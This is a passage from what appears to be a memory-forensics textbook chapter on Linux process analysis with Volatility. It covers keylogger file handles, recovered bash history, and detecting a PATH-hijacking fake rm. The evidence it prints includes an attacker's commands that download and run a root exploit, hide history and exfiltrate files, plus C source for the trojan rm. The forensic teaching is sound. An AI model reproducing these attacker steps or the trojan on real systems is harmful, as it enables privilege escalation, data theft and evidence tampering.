$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime 
    linux_netstat -p 2745
Volatility Foundation Volatility Framework 2.4
TCP      192.168.174.169:22    192.168.174.1:54944 ESTABLISHED sshd/2745
UNIX     DGRAM   6607   sshd/2745
```

The following shows the file descriptors of a Linux key logger named `logkey` ([http://code.google.com/p/logkeys/](http://code.google.com/p/logkeys/)):

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f keylog.lime 
      linux_pslist | grep logkeys
Volatility Foundation Volatility Framework 2.4
0xffff88003b122fe0 logkeys    8625    0     0  0x3b005000 2013-11-29 13:38:05 

$ python vol.py --profile=LinuxDebian-3_2x64 -f keylog.lime 
      linux_psaux -p 8625
Volatility Foundation Volatility Framework 2.4
Pid    Uid    Gid    Arguments
8625   0      0      ./logkeys -s -o /usr/share/logfile.txt –u

$ python vol.py --profile=LinuxDebian-3_2x64 -f keylog.lime 
      linux_lsof -p 8625
Volatility Foundation Volatility Framework 2.4
Pid      FD       Path
-------- -------- ----
    8625        0 /dev/input/event0
    8625        1 /usr/share/logfile.txt
    8625        2 /dev/pts/1
    8625        3 /usr/share/bash-completion/completions
```

In this output, you can see that `logkeys` is running as PID 8625, and it is configured to log to `/usr/share/logfile.txt`. Examining the file handles shows that file descriptor 1 is the log file, and descriptor 0 is `/dev/input/event0`. The `event0` file is a handle to the keyboard and the key logger reads this file to steal keystrokes from userland.

## Saved Context State

Edwin Smulders submitted a number of Linux plugins to the 2013 Volatility plugin contest: [http://www.volatilityfoundation.org/contest/2013/EdwinSmulders_Symbols.zip](http://www.volatilityfoundation.org/contest/2013/EdwinSmulders_Symbols.zip). These plugins involve enumerating active threads within a memory sample, along with their current execution context. Remember that during a context switch, the state of the currently executing thread is saved so that the registers, page tables, and other information can be restored when the thread is resumed. Edwin’s plugins enable Volatility to recover and analyze this saved state. Here’s a brief description of how you can use Edwin’s plugins:

- `linux_threads`: Each process has one or more threads that execute distinct units of code. This plugin identifies the threads by their thread ID and provides the base functionality for the following plugins.
- `linux_info_regs`: During a context switch, the current process state is saved to the kernel stack. Volatility can recover this state to determine previous process activity.
- `linux_process_syscall`: Context switches are often triggered when a thread makes a system call. You can determine which system call the application was making and the parameters sent to the handler.
- `linux_process_stack`: Stack frames contain return addresses, local variables, and function parameters. This plugin recovers stack frames and attempts to determine the symbolic name of the function represented by each frame.

## Bash Memory Analysis

So far in this chapter, you learned how to find processes in memory, isolate their address spaces from the rest of physical memory, and extract individual regions of process memory. In this section, we show how to leverage those capabilities to recover commands that users, adversaries, and automated malware samples enter into bash shells. Because bash is the default user shell on nearly all Linux distributions, extracting commands is extremely valuable and practical.

---

## **Data Structures**

The following code shows the definition of `_hist_entry`, which represents a line of a `.bash_history` file:

```
>>> dt("_hist_entry")
'_hist_entry' (24 bytes)
0x0   : line                           ['pointer', ['String', {'length': 1024}]]
0x8   : timestamp                      ['pointer', ['String', {'length': 1024}]]
0x10  : data                           ['pointer', ['void']]
```

## **Key Points**

The key points are these:

- `line`: The command entered by the user.
- `timestamp`: The time the command was executed, stored as epoch time prefixed with a pound sign (`#`).

---

### Bash History

During normal operations, bash will log commands into the user’s history file (~/.`bash_history`). Attackers obviously don’t want their commands being recorded, so frequently you will encounter attempts to disable such logging. There are a number of ways to do this:

- **History file variable**: Unsetting the `HISTFILE` environment variable or pointing it to `/dev/null`
- **History size variable**: Setting the `HISTSIZE` environment variable to 0
- **SSH parameters**: Logging in using the Linux SSH client with the -`T` parameter set to prevent pseudoterminal allocation

The use of these antiforensics techniques has a very negative effect on disk-forensics, but, as in many other cases, does not affect memory forensics. Even if logging to disk is disabled, bash not only keeps commands in memory but also keeps the time each command executed.

### Linux Bash Plugin

The `linux_bash` plugin recovers _`hist_entry` structures from memory. In particular, it scans the heap for the `#` (pound) characters that prefix each timestamp. Because the timestamps are stored as a string, the plugin then rescans the heap looking for pointers to the pound characters, which are potential `timestamp` members of the structure.

The following output shows the `linux_bash` plugin results for the main `bash` instance from the 2008 DFRWS challenge (see [http://dfrws.org/2008/challenge/submission.shtml](http://dfrws.org/2008/challenge/submission.shtml)). This challenge focused on an attacker that exfiltrated data from a victim organization:

```
$ python vol.py --profile=Linuxdfrws-profilex86 -f challenge.mem
     linux_bash -p 2585
Pid      Name  Command Time                   Command
-------- ----- ------------------------------ -------
    2585 bash  2007-12-17 03:24:21 UTC+0000   unset HISTORY
    2585 bash  2007-12-17 03:24:21 UTC+0000   cd xmodulepath
    2585 bash  2007-12-17 03:24:21 UTC+0000   wget http://metasploit.com/users/
hdm/tools/xmodulepath.tgz
    2585 bash  2007-12-17 03:24:21 UTC+0000   tar -zpxvf xmodulepath.tgz
    2585 bash  2007-12-17 03:24:21 UTC+0000   ./root.sh
    2585 bash  2007-12-17 03:24:21 UTC+0000   id
    2585 bash  2007-12-17 03:24:21 UTC+0000   mkdir temp
    2585 bash  2007-12-17 03:24:21 UTC+0000   cd temp
    2585 bash  2007-12-17 03:24:21 UTC+0000   cp /mnt/hgfs/Admin_share/*.pcap .
    2585 bash  2007-12-17 03:24:21 UTC+0000   cp /mnt/hgfs/Admin_share/*.xls .
    2585 bash  2007-12-17 03:24:21 UTC+0000   cp /mnt/hgfs/Admin_share/
intranet.vsd .
    2585 bash  2007-12-17 03:24:40 UTC+0000   ls /mnt/hgfs/Admin_share/
    2585 bash  2007-12-17 03:26:20 UTC+0000   zip archive.zip 
/mnt/hgfs/Admin_share/acct_prem.xls /mnt/hgfs/Admin_share/domain.xls /mnt/hgfs/Admin_share/ftp.pcap
    2585 bash  2007-12-17 03:26:55 UTC+0000   unset HISTFILE
    2585 bash  2007-12-17 03:26:59 UTC+0000   unset HISTSIZE
    2585 bash  2007-12-17 03:27:46 UTC+0000   zipcloak archive.zip
    2585 bash  2007-12-17 03:28:25 UTC+0000   ll -h
    2585 bash  2007-12-17 03:28:54 UTC+0000   cp /mnt/hgfs/software/xfer.pl .
    2585 bash  2007-12-17 03:28:57 UTC+0000   ll -h
    2585 bash  2007-12-17 03:29:56 UTC+0000   export http_proxy="http:
//219.93.175.67:80"
    2585 bash  2007-12-17 03:30:00 UTC+0000   env | less
    2585 bash  2007-12-17 03:31:56 UTC+0000   ./xfer.pl archive.zip
    2585 bash  2007-12-17 04:32:50 UTC+0000   unset http_proxy
    2585 bash  2007-12-17 04:32:53 UTC+0000   rm xfer.pl
    2585 bash  2007-12-17 04:33:26 UTC+0000   dir
    2585 bash  2007-12-17 04:33:29 UTC+0000   rm archive.zip
```

For the sake of brevity, only the most interesting entries are shown. As you can see, the attacker executed many actions in the following categories:

- **Antiforensics:** The attacker employs several antiforensics techniques, including preventing bash from writing to disk by unsetting the `HISTFILE` and `HISTSIZE` variables and (insecurely) deleting `archive.zip` after exfiltrating it.
- **Privilege escalation:** The Metasploit `xmodulepath` package is an exploit used to gain root privileges on systems with vulnerable X versions.
- **Exfiltration:** Several files are copied to the guest through the VMware guest to host filesystem (`/mnt/hgfs`). They are then packaged and exfiltrated using `xfer.pl`.

It is important to note that when a bash shell opens, it reads saved commands from `~/.bash_history` (if available) and copies them into memory. If the `HISTTIMEFORMAT` variable was set for previous bash sessions, the history file will contain timestamps and that information is also copied into memory. However, if the history file does *not* contain timestamps, then bash assigns a default timestamp of when the bash process started. All commands entered into the new bash session are recorded along with the actual time they were entered. With this point in mind, notice the first several commands all have the same timestamp (`2007-12-17 03:24:21`). In this case, the time indicates when the bash process started, not when the commands executed.

### Bash Command Hash Table

Bash also keeps a hash table that contains the full path to the commands and the number of times they executed. You can view this hash table on a live system with the `hash` command inside of a `bash` shell. Unlike the typical bash history entries, the hash table translates command names to their full path. For example, it stores `/bin/rm` rather than `rm`). Attackers or malicious applications can change a shell’s `PATH` variable and point the user to binaries of the attacker’s choosing. Such activity is immediately obvious through the use of the `linux_bash_hash` plugin.

#### The Fake rm Command

To illustrate the described attack, the source code for an example malicious `rm` binary is shown here:

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char **argv, char **env)
{
    int i;
    char *prefix = "v0l";

    int sz = 255 * sizeof(void *);
    char **args = malloc(sz);
    memset(args, 0x00, sz);
    int argscnt = 0;

    for(i = 0; i < argc; i++)
    {
        if(strncmp(argv[i], prefix, 3) != 0)
        {
            args[argscnt] = argv[i];
            argscnt = argscnt + 1;
        }
    }

    execvp("/bin/rm", args, env);
}
```

The malicious program does not allow files that start with `v0l` to be removed. When the program runs, it enumerates all command-line arguments and builds a new set of arguments, excluding any entries that contain the `v0l` substring. It then executes the real `rm` command with its filtered list.

#### Detecting the Fake Binary

To force a systems administrator to use this binary, an attacker can place it on the file system in a directory such as `/tmp` and then prepend /`tmp` to the victim user’s `PATH` variable. Thus, when the user executes `rm`, it will really be the fake version in `/tmp` instead of the real one in `/bin`. Luckily, the `linux_bash_hash` and `linux_env` plugins can both help you detect this type of attack:

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f backdooredrm.lime 
    linux_bash_hash -p 23971
Volatility Foundation Volatility Framework 2.4
Pid      Name                 Hits   Command                   Full Path
-------- -------------------- ------ ------------------------- ---------
   23971 bash                      1 df                        /bin/df
   23971 bash                      1 rmmod                     /sbin/rmmod
   23971 bash                      1 rm                        /tmp/rm
   23971 bash                      1 vim                       /usr/bin/vim
   23971 bash                      1 cat                       /bin/cat
   23971 bash                      1 insmod                    /sbin/insmod
   23971 bash                      2 ls                        /bin/ls
   23971 bash                      3 clear                     /usr/bin/clear

$ python vol.py --profile=LinuxDebian-3_2x64 -f backdooredrm.lime 
    linux_bash_env -p 23971
Volatility Foundation Volatility Framework 2.4
Pid      Name     Vars
-------- -------- ----
   23971 bash     TERM=xterm SHELL=/bin/bash SSH_CLIENT=192.168.174.1 54634 22 
                  OLDPWD=/root SSH_TTY=/dev/pts/2 USER=root MAIL=/var/mail/root 
PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
                  PWD=/root/lime LANG=en_US.UTF-8 HOME=/root LOGNAME=root 
                  SSH_CONNECTION=192.168.174.1 54634 192.168.174.169 22 
                  _=/sbin/insmod
```

In the output from `linux_bash_hash`, there is a listing of `rm` with a full path of `/tmp/rm`. In `linux_bash_env`, the `PATH` variable shows `/tmp` as the first directory to be consulted when looking for applications. In Chapter 24, where you see how to recover file systems from memory, you will revisit this memory sample and learn how to extract the malicious `rm` binary from memory.

In one of our previous cases, attackers altered a privileged user’s `.bashrc` file (presumably by exploiting a client-side vulnerability) and pointed the `PATH` variable into a directory that contained a trojanized `sudo` binary. The malicious `sudo` binary recorded the user’s plaintext password. This technique allowed the adversary to collect the password and elevate privileges along with attempting to move laterally to other systems.

## Summary

Analyzing processes and artifacts you find in process memory is a critical component of memory forensics. By extracting bash history, you can practically see a transcript of every action a remote attacker performed on a victim system. If the history isn’t available for any reason, you can also inspect environment variables, open handles, command-line arguments, and shared libraries for evidence of foul play. You also have the capability to extract specific regions of process memory to separate files on disk. This allows you to analyze them with static analysis tools, scan them with antivirus signatures, and so on.
